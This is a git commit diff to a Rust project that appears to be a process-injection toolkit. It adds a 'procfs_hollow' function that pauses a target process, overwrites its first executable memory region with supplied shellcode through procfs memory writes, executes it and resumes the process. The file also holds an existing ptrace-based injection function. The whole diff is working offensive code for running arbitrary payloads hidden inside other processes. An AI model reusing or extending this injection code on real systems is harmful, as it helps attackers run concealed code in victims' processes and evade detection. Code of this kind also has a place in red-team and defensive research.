a871ddbfa215b92793385433a1d19f4816896968
dustyw0lf <dustyw0lf@users.noreply.github.com>
2024-11-20 22:28:01 +0200

    feat(procfs): implement procfs_hollow technique as injection

--- src/techniques/inject.rs
+++ src/techniques/inject.rs
@@ -1,7 +1,11 @@
 //! Techniques that inject a payload into an existing process.
 
+use nix::sys::signal::kill;
+use nix::sys::signal::Signal::{SIGCONT, SIGSTOP};
+
 use crate::error::{Error, Result};
 use crate::payload::{Inject, Payload, PayloadType};
+use crate::primitives::procfs::{find_mem_region, mem_exec, mem_write};
 use crate::primitives::ptrace::ptace_write_rip;
 
 /// Uses ptrace to inject shellcode into a target process by overwriting its RIP register.
@@ -36,5 +40,30 @@ pub fn hollow(payload: Payload<Inject>) -> Result<()> {
             ptace_write_rip(payload.pid(), payload.bytes(), false)?;
         }
     }
+    Ok(())
+}
+
+pub fn procfs_hollow(payload: Payload<Inject>) -> Result<()> {
+    match payload.payload_type() {
+        PayloadType::Executable => {
+            return Err(Error::NotImplemented(
+                "hollow can not take executables".to_string(),
+            ));
+        }
+        PayloadType::Shellcode => {
+            let pid = payload.pid();
+
+            kill(pid, SIGSTOP)?;
+
+            let addr = find_mem_region(pid, true, "r-x")?[0];
+
+            mem_write(pid, addr, payload.bytes())?;
+
+            mem_exec(pid, addr)?;
+
+            kill(pid, SIGCONT)?;
+        }
+    }
+
     Ok(())
 }
